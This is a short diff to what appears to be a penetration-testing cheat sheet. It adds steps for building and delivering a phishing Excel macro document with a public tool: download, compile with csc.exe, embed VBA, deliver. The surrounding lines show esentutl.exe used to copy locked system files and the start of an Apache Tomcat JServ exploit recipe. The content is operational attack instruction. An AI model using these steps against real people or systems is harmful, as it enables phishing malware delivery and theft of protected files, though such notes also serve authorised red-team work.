@@ -138,6 +138,13 @@ Remote Execute
     * COPY ANY SYSTEM FILE
       C:\windows\system32\esentutl.exe /y <source-file> /vss /d <dest-file>
       
+Phishing Macro XLM 
+    Download https://github.com/FortyNorthSecurity/hot-manchego
+    PS> New-Item blank.xlsm
+    PS> C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /reference:EPPlus.dll hot-manchego.cs
+    PS> .\hot-manchego.exe .\blank.xlsm .\vba.txt
+    Deliver xlsm file    
+
 Apache Tomcat JServ exploit
     https://ionize.com.au/exploiting-apache-tomcat-port-8009-using-apache-jserv-protocol/
     Install the Dependencies on attack box
